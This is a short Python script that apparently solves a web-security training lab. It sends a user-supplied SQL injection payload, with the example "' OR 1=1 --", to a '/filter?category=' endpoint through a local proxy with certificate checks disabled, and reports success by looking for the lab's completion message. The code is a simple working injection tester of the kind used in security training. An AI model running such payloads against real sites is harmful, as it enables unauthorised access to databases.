import requests
import urllib3
import sys

proxies = { 'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080' }

def exploit_sqli(url, payload):
  urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # Disable SSL verification warning
  uri = "/filter?category="
  labResponse = requests.get(url + uri + payload, proxies=proxies, verify=False)
  # Check if the SQL injection is successful
  if "Congratulations, you solved the lab!" in labResponse.text:
    return True
  else:
    return False

if __name__ == "__main__":
  try:
    url = sys.argv[1].strip()
    payload = sys.argv[2].strip()
  except IndexError:
    print("[+] Usage: %s <url> <payload>" % sys.argv[0])
    print("[+] Example: %s www.example.com \"' OR 1=1 --\"" % sys.argv[0])
    sys.exit(-1)

  if exploit_sqli(url, payload):
    print("[+] SQL Injection successful!")
  else:
    print("[-] SQL Injection unsuccessful!")
